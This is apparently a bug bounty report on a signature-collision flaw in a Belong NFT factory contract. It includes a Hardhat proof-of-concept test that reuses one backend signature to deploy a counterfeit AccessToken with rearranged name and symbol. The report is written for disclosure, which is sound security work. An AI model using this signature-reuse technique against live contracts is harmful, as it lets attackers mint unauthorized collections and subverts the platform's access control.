# 56867 sc medium signature collision caused counterfeit accesstoken collections with arbitrary name symbol uri

**Submitted on Oct 21st 2025 at 11:16:06 UTC by @zzkiel for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #56867
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/belongnet/checkin-contracts/blob/main/contracts/v2/utils/SignatureVerifier.sol>
* **Impacts:**
  * Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)

## Description

### Intro

Factory’s signature checks for both `AccessToken` and `CreditToken` use `abi.encodePacked` on multiple user-controlled strings. Because concatenation lacks explicit boundaries, different `(name, symbol, contractURI, …)` payloads can collide to the same byte stream. An attacker who obtains one legitimate backend signature can rearrange characters, reuse the signature, and deploy an unauthorized collection. This bypasses the intended access control on `Factory.produce` and `Factory.produceCreditToken`.

### Impact Details

* Deploy counterfeit `AccessToken` collections with arbitrary name/symbol/URI and potentially altered royalty settings using a previously issued signature.
* Deploy `CreditToken` clones with unapproved metadata from the same signature.
* Trust assumptions on signed payloads are broken; external metadata/fee governance can be subverted.

## References

Add any relevant links to documentation or code

## Proof of Concept

### Proof of Concept (exploit test)

```typescript
import { expect } from 'chai';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { ethers, upgrades } from 'hardhat';

import { deploySignatureVerifier } from '../../../helpers/deployLibraries';
import {
  deployAccessTokenImplementation,
  deployCreditTokenImplementation,
  deployRoyaltiesReceiverV2Implementation,
  deployVestingWalletImplementation,
} from '../../../helpers/deployFixtures';

import { Factory } from '../../../typechain-types';
import { AccessTokenInfoStruct } from '../../../typechain-types/contracts/v2/platform/Factory';

const NATIVE_CURRENCY_ADDRESS = '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE';

describe('Signature collision reproduction', function () {
  async function deployFixture() {
    const [deployer, creator] = await ethers.getSigners();
    const backendSigner = ethers.Wallet.createRandom().connect(ethers.provider);

    const signatureVerifier = await deploySignatureVerifier();
    const accessTokenImpl = await deployAccessTokenImplementation(signatureVerifier.address);
    const creditTokenImpl = await deployCreditTokenImplementation();
    const royaltiesImpl = await deployRoyaltiesReceiverV2Implementation();
    const vestingImpl = await deployVestingWalletImplementation();

    const factoryFactory = await ethers.getContractFactory('Factory', {
      libraries: { SignatureVerifier: signatureVerifier.address },
    });

    const implementations = {
      accessToken: accessTokenImpl.address,
      creditToken: creditTokenImpl.address,
      royaltiesReceiver: royaltiesImpl.address,
      vestingWallet: vestingImpl.address,
    };

    const factoryParams = {
      transferValidator: ethers.constants.AddressZero,
      platformAddress: deployer.address,
      signerAddress: backendSigner.address,
      platformCommission: 100,
      defaultPaymentCurrency: NATIVE_CURRENCY_ADDRESS,
      maxArraySize: 10,
    };

    const royalties = {
      amountToCreator: 8000,
      amountToPlatform: 2000,
    };

    const referralPercents = [0, 0, 0, 0, 0];

    const factory = (await upgrades.deployProxy(
      factoryFactory,
      [factoryParams, royalties, implementations, referralPercents],
      {
        unsafeAllow: ['constructor'],
        unsafeAllowLinkedLibraries: true,
      },
    )) as Factory;

    await factory.deployed();

    return {
      factory,
      creator,
      backendSigner,
      signatureVerifier,
    };
  }

  it('Should deploy a forged AccessToken via signature collision', async function () {
    const { factory, backendSigner, creator, signatureVerifier } = await loadFixture(deployFixture);

    const chainId = (await ethers.provider.getNetwork()).chainId;

    const legitInfo: AccessTokenInfoStruct = {
      paymentToken: ethers.constants.AddressZero,
      feeNumerator: 500,
      transferable: true,
      maxTotalSupply: 1000,
      mintPrice: ethers.utils.parseEther('1'),
      whitelistMintPrice: ethers.utils.parseEther('0.8'),
      collectionExpire: 0,
      metadata: { name: 'Bel', symbol: 'ong' },
      contractURI: 'ipfs://good',
      signature: '0x',
    };

    const legitHash = ethers.utils.keccak256(
      ethers.utils.solidityPack(
        ['string', 'string', 'string', 'uint96', 'uint256'],
        [
          legitInfo.metadata.name,
          legitInfo.metadata.symbol,
          legitInfo.contractURI,
          legitInfo.feeNumerator,
          chainId,
        ],
      ),
    );

    const signature = ethers.utils.joinSignature(backendSigner._signingKey().signDigest(legitHash));

    const forgedInfo: AccessTokenInfoStruct = {
      ...legitInfo,
      metadata: { name: 'Belon', symbol: 'g' },
      signature,
    };

    await expect(factory.connect(creator).produce(forgedInfo, ethers.constants.HashZero)).to.not.be.reverted;

    const storedInfo = await factory.nftInstanceInfo(forgedInfo.metadata.name, forgedInfo.metadata.symbol);
    expect(storedInfo.nftAddress).to.not.equal(ethers.constants.AddressZero);

    const accessToken = await ethers.getContractAt('AccessToken', storedInfo.nftAddress);

    expect(await accessToken.name()).to.equal('Belon');
    expect(await accessToken.symbol()).to.equal('g');

    console.log(
      'Forged AccessToken deployed:',
      await accessToken.name(),
      '/',
      await accessToken.symbol(),
      'at',
      storedInfo.nftAddress,
    );
  });

  it('Should revert once concatenation changes (control)', async function () {
    const { factory, backendSigner, creator } = await loadFixture(deployFixture);

    const chainId = (await ethers.provider.getNetwork()).chainId;

    const legitInfo: AccessTokenInfoStruct = {
      paymentToken: ethers.constants.AddressZero,
      feeNumerator: 500,
      transferable: true,
      maxTotalSupply: 1000,
      mintPrice: ethers.utils.parseEther('1'),
      whitelistMintPrice: ethers.utils.parseEther('0.8'),
      collectionExpire: 0,
      metadata: { name: 'Bel', symbol: 'ong' },
      contractURI: 'ipfs://good',
      signature: '0x',
    };

    const legitHash = ethers.utils.keccak256(
      ethers.utils.solidityPack(
        ['string', 'string', 'string', 'uint96', 'uint256'],
        [
          legitInfo.metadata.name,
          legitInfo.metadata.symbol,
          legitInfo.contractURI,
          legitInfo.feeNumerator,
          chainId,
        ],
      ),
    );

    const signature = ethers.utils.joinSignature(backendSigner._signingKey().signDigest(legitHash));

    const mismatchedInfo: AccessTokenInfoStruct = {
      ...legitInfo,
      metadata: { name: 'Evil', symbol: 'Token' },
      signature,
    };

    await expect(
      factory.connect(creator).produce(mismatchedInfo, ethers.constants.HashZero),
    ).to.be.reverted;
  });
});
```

## Reproduction

{% stepper %}
{% step %}

### Exploit test artifact

* Path: `test/v2/platform/signature-collision.test.ts`
* What it does:
  * Deploys the Factory stack locally (no fork/PK required).
  * Signs a legitimate `(name="Bel", symbol="ong")` payload.
  * Reuses the same signature to deploy a forged collection `(name="Belon", symbol="g")`.
  * Prints the forged collection address and asserts the metadata matches the forged values.
    {% endstep %}
    {% endstepper %}

### Running the exploit test

```bash
npm install --legacy-peer-deps     # once per clone
npx hardhat test test/v2/platform/signature-collision.test.ts
```

Output confirms the forged deployment:

```
Forged AccessToken deployed: Belon / g at <address>
```
